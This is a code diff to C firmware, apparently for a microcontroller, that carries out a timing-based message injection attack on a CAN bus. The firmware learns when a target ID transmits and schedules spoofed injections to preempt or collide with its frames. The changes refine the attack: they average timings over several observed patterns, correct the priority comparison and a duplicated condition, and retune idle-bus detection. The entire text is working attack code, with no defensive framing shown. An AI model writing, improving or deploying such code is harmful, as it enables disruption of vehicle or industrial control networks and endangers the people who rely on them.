@@ -115,7 +115,7 @@ volatile uint32_t g_target_id = 0;
 volatile uint32_t g_ui32TargetXmitTime = 0;
 volatile uint8_t g_skip_attack = SKIP_ATTACK;
 
-#define NUM_PATTERN_HP (1)
+#define NUM_PATTERN_HP (4)
 #define TYPE_I_ATTACK (1)
 #define TYPE_II_ATTACK (2)
 #define TYPE_III_ATTACK (3)
@@ -399,7 +399,7 @@ void send_messages(uint32_t count)
                 g_hp_base = TimerValueGet(TIMER3_BASE, TIMER_A);
                 if (g_current_pattern >= NUM_PATTERN_HP) {
                     uint32_t time = attack_patterns[0][g_current_pattern_index].time;    // FIXME: add optimizations
-                    TimerLoadSet(TIMER1_BASE, TIMER_A, time - TARGET_XMIT_TIME/2); // FIXME: MAGIC?
+                    TimerLoadSet(TIMER1_BASE, TIMER_A, time + TARGET_XMIT_TIME/2); // FIXME: MAGIC?
                     TimerEnable(TIMER1_BASE, TIMER_A);
                 }
             }
@@ -457,11 +457,11 @@ void Timer1IntHandler(void)
         g_current_pattern_index++;
 
         time = attack_patterns[0][g_current_pattern_index].time - time;    // FIXME: add optimizations
-        TimerLoadSet(TIMER1_BASE, TIMER_A, time + TARGET_XMIT_TIME/2); // FIXME: MAGIC?
+        TimerLoadSet(TIMER1_BASE, TIMER_A, time); // the first interrupt is shifted by +xmit_time/2, so subsequent intervals already adjusted
         TimerEnable(TIMER1_BASE, TIMER_A);
 
         // TODO: need to do anything else based on the "type"?
-        if (type == TYPE_I_ATTACK || type == TYPE_II_ATTACK) {
+        if (type/NUM_PATTERN_HP <= TYPE_II_ATTACK) {  // No IDLE injections
             do_attack_injection();
         }
     }
@@ -747,7 +747,7 @@ void do_sba(int ID, int count, tCANMsgObject *msg )
         if (msg) xmit_time = (((44+(msg->ui32MsgLen*8))*120000)/(BITRATE/1000)); // estimated
         delta = g_ui32PenultimateCANIntTimer - g_ui32LastCANIntTimer;
         ti = g_hp_base - (g_ui32LastCANIntTimer + xmit_time); // countdown timer
-        if (delta > 8*xmit_time) { // FIXME: magic value 2 to find idle vs non-idle times
+        if (delta > 3*xmit_time) { // FIXME: magic value 2 to find idle vs non-idle times
             // probably idle bus
             is_idle = true;
             g_th = g_tl = -1;
@@ -756,21 +756,23 @@ void do_sba(int ID, int count, tCANMsgObject *msg )
                 // lower priority than victim
                 g_tl = ti;
                 g_th = -1;
-            } else if (ID > TARGET_ID /*&& g_th < 0*/) {
+            } else if (ID < TARGET_ID /*&& g_th < 0*/) {
                 g_th = ti;
                 g_tl = -1;
             }
         }
         if (ID == TARGET_ID) {
+            attack_patterns[0][g_current_pattern_index].time = 0;
+            attack_patterns[0][g_current_pattern_index].type = 0;
             if (g_th >= 0) {
-                attack_patterns[g_current_pattern][g_current_pattern_index].time = g_th;
-                attack_patterns[g_current_pattern][g_current_pattern_index].type = TYPE_I_ATTACK;
-            } else if (g_th >= 0) {
-                attack_patterns[g_current_pattern][g_current_pattern_index].time = g_tl;
-                attack_patterns[g_current_pattern][g_current_pattern_index].type = TYPE_II_ATTACK;
+                attack_patterns[0][g_current_pattern_index].time += (g_th/NUM_PATTERN_HP);
+                attack_patterns[0][g_current_pattern_index].type += TYPE_I_ATTACK;
+            } else if (g_tl >= 0) {
+                attack_patterns[0][g_current_pattern_index].time += (g_tl/NUM_PATTERN_HP);
+                attack_patterns[0][g_current_pattern_index].type += TYPE_II_ATTACK;
             } else {
-                attack_patterns[g_current_pattern][g_current_pattern_index].time = ti;
-                attack_patterns[g_current_pattern][g_current_pattern_index].type = TYPE_III_ATTACK;
+                attack_patterns[0][g_current_pattern_index].time += ((ti-xmit_time)/NUM_PATTERN_HP);
+                attack_patterns[0][g_current_pattern_index].type += TYPE_III_ATTACK;
             }
             g_tl = g_th = -1;
             g_current_pattern_index++;
